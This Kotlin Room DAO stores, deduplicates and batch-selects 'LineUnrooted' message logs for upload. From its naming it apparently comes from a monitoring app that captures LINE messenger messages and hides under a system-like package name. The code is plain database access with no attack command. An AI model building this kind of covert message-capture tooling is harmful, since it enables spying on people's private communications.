package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.LineUnrooted
import com.android.services.util.AppConstants

@Dao
interface LineUnrootedDao {
    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(imoUnrooted: LineUnrooted)

    @Query("Select uniqueId from line_unrooted_table where uniqueId = :messageId")
    fun checkLineIfAlreadyExist(messageId: String): String?

    @Query("Select * from line_unrooted_table where status = :status order by id ASC limit ${AppConstants.imLogsUploadLimit}")
    fun selectAllLineUnrootedLogs(status: Int): List<LineUnrooted>

    @Query("Update line_unrooted_table set status = :updated_status where id BETWEEN :startId AND :endId")
    fun update(startId: Int, endId: Int, updated_status: Int): Int
}